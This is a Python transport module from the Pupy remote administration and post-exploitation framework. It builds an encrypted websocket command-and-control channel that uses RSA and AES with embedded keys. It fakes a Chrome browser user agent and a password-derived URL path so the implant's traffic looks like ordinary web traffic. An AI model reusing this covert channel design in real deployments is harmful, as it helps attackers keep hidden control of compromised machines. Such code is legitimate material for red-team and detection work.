# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from network.transports import Transport, LAUNCHER_TYPE_BIND
from network.lib import PupyTCPServer, PupyTCPClient, PupySocketStream
from network.lib import RSA_AESClient, RSA_AESServer, PupyWebSocketClient, PupyWebSocketServer
from network.lib import chain_transports

from hashlib import md5

DEFAULT_USER_AGENT = \
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 ' \
  '(KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36'

class TransportConf(Transport):
    info = "TCP transport using Websocket with RSA+AES"
    name = "websocket"
    server = PupyTCPServer
    client = PupyTCPClient
    stream = PupySocketStream
    credentials = ['SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY', 'SCRAMBLESUIT_PASSWD']
    internal_proxy_impl = ['HTTP']

    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)

        try:
            import pupy_credentials
            RSA_PUB_KEY = pupy_credentials.SIMPLE_RSA_PUB_KEY
            RSA_PRIV_KEY = pupy_credentials.SIMPLE_RSA_PRIV_KEY
            SCRAMBLESUIT_PASSWD = pupy_credentials.SCRAMBLESUIT_PASSWD

        except ImportError:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            RSA_PUB_KEY = credentials['SIMPLE_RSA_PUB_KEY']
            RSA_PRIV_KEY = credentials['SIMPLE_RSA_PRIV_KEY']
            SCRAMBLESUIT_PASSWD = credentials['SCRAMBLESUIT_PASSWD']

        self.client_transport_kwargs.update({
            'host': None,
            'path': '/ws/' + ''.join(md5(SCRAMBLESUIT_PASSWD).hexdigest()[:8]),
            'user-agent': DEFAULT_USER_AGENT
        })

        self.server_transport_kwargs.update({
            'path': '/ws/' + ''.join(md5(SCRAMBLESUIT_PASSWD).hexdigest()[:8]),
            'user-agent': DEFAULT_USER_AGENT
        })

        if self.launcher_type == LAUNCHER_TYPE_BIND:
            self.client_transport = chain_transports(
                    PupyWebSocketClient,
                    RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    PupyWebSocketServer,
                    RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )

        else:
            self.client_transport = chain_transports(
                    PupyWebSocketClient,
                    RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    PupyWebSocketServer,
                    RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256),
                )
